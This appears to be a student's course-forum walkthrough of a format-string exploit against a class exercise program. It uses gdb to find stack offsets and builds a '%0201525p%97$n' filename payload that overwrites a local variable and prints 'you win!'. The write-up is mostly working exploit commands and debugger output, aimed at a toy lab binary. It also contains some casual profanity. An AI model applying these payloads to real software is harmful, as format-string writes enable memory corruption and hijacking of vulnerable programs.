https://piazza.com/class/lm3dh436w1h4oo/post/241
```
>>> gcc -o %p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p -g -DEASY game.c
>>> gdb --args env -i ./%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p $'\x34\x12\xff\xff\xff\x7f' '' 'b'

(gdb) start
(gdb) x/1xg argv[1]
0x7fffffffefc8: 0x00007fffffff1234
// This pointer is placed on the stack, the address of the pointer is aligned correctly (8 byte aligned, ends in either 0 or 8)

(gdb) p &i
$1 = (const int *) 0x7fffffffed04
// Now that we have the address of i, we can pass that in

>>> gdb --args env -i ./%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p $'\x04\xed
\xff\xff\xff\x7f' '' 'b'
(gdb) x/1xg argv[1]
0x7fffffffefc8: 0x00007fffffffed04
(gdb) p &i
$1 = (const int *) 0x7fffffffed04
```

We know that the first 6 arguments to a function are passed in the registers while the rest are on the stack. The first argument is of course the format string, so the first 5 `"%p"`'s will print the contents of the remaining 5 (non format string) argument registers. All remaining `"%p"`'s will print values off the stack. This means at a minimum, you need 6 `"%p"`'s, but the more stack values you have, the easier it is to verify you found the correct location. 

The caller is responsible for loading the first 6 arguments into registers then pushing the remaining arguments onto the stack, meaning that when you are at the first instruction of the `printf()` call in this case, the stack pointer will be pointing to one 8-byte block past the first stack argument (as the `call` assembly instruction will push the return address onto the stack)
```
(gdb) start
(gdb) n
6           const char * str = "this is a string";
(gdb) n
7           const int i = 0;
(gdb) n
8           uint8_t j = 128;
(gdb) n
10         uint64_t k = (uint64_t)&i;
(gdb) n
12          uint8_t l = 255;
(gdb) n
14          printf(argv[0]);
(gdb) si 6
0x0000555555555094 in printf@plt ()
(gdb) p $rsp+8
$1 = (void *) 0x7fffffffecf0
(gdb) x/6xg 0x7fffffffecf0
0x7fffffffecf0: 0x00007fffffffee18      0x0000000455555230
0x7fffffffed00: 0x00000000ff800000      0x0000555555556004
0x7fffffffed10: 0x00007fffffffed04      0x68b9979b690eaf00
```
 - We now have the address of our malicious pointer (`0x7fffffffefc8`) which points to `i` as  well as the address of the 6th `printf` argument (`0x7fffffffecf0`)
 - Reminder of our malicious pointer address"
	```malicious
	(gdb) x/1xg argv[1]
	0x7fffffffefc8: 0x00007fffffffed04
	```
 - Now calculate the parameter offset we need for `printf()` to find the malicious pointer
```Math
(0x7fffffffefc8 - 0x7fffffffecf0) / 8 + 6 = ?
(728) / 8 + 6 = 97
```
 - This is how many bytes away the malicious pointer is from the known pointer being found by printf. Since each pointer is 8 bytes, divide by 8 to learn how many pointers we are. Finally, since our reference point is the 6th argument we add 6. Our malicious pointer is the 97th argument to printf
 - This can be tested as follows: (remember the length of the arguments need to remain the same)
```
>>> gcc -o $'%97$p------------------------------' -g -DEASY game.c
>>> env -i $'./%97$p------------------------------' $'\x04\xed\xff\xff\xff\x7f' '' 'b'   ./0x7fffffffed04------------------------------you lose!
```
 - This is now printing out our malicious pointer. If we replace this with `%n` then we will overwrite `i`. Since the overwritten value would still be 0, we need to print `0x31337` characters before `%n`
 - Since that is way too many characters, linux won't let you do that. However we can double check first to make sure that the process is sound
```
>>> gdb --args env -i $'./fuck%97$n--------------------------' $'\x04\xed\xff\xff\xff\x7f' '' 'b'

(gdb) start
(gdb) p i
$1 = 0
(gdb) n
6           const char * str = "this is a string";
(gdb) n
7           const int i = 0;
(gdb) n
8           uint8_t j = 128;
(gdb) n
10         uint64_t k = (uint64_t)&i;
(gdb) n
12          uint8_t l = 255;
(gdb) n
14          printf(argv[0]);
(gdb) p i
$2 = 0
(gdb) p argv[0]
$3 = 0x7fffffffefa2 "./fuck%97$n", '-' <repeats 26 times>
(gdb) n
15          if (i == 0x31337)
(gdb) p i
$4 = 6
```
 - You can see that the value of `i` has been overwritten to `6` after `printf` has been called

**0x31337**:
 - Insert string formatting, the filename can't be 200k+ characters but `printf` can do that for you
 - New filename: `'%0201525p%97$n---------------------'`
	 - `0x31337 = 201527`, this is reduced by 2 because for some reason `argv[0]` counts `./`
	 - This pads the `printf` statement with 201525 `0`s before calling `$n` on the 97th variable given to `printf`
```
>>> gdb --args env -i $'./%0201525p%97$n---------------------' $'\x04\xed\xff\xff\xff\x7f' '' 'b'

(gdb) start
(gdb) p i
$1 = 0
(gdb) n
6           const char * str = "this is a string";
(gdb) n
7           const int i = 0;
(gdb) n
8           uint8_t j = 128;
(gdb) n
10         uint64_t k = (uint64_t)&i;
(gdb) n
12          uint8_t l = 255;
(gdb) n
14          printf(argv[0]);
(gdb) n
... big ass text string blowing up terminal
(gdb) p i
$1 = 201527
(gdb) n
17              printf("you win!\n");
```
```
>>> env -i $'./%0201525p%97$n---------------------' $'\x04\xed\xff\xff\xff\x7f' '' 'b'
000<... shitload of 0s>00007fffffffee18---------------------you win!
```
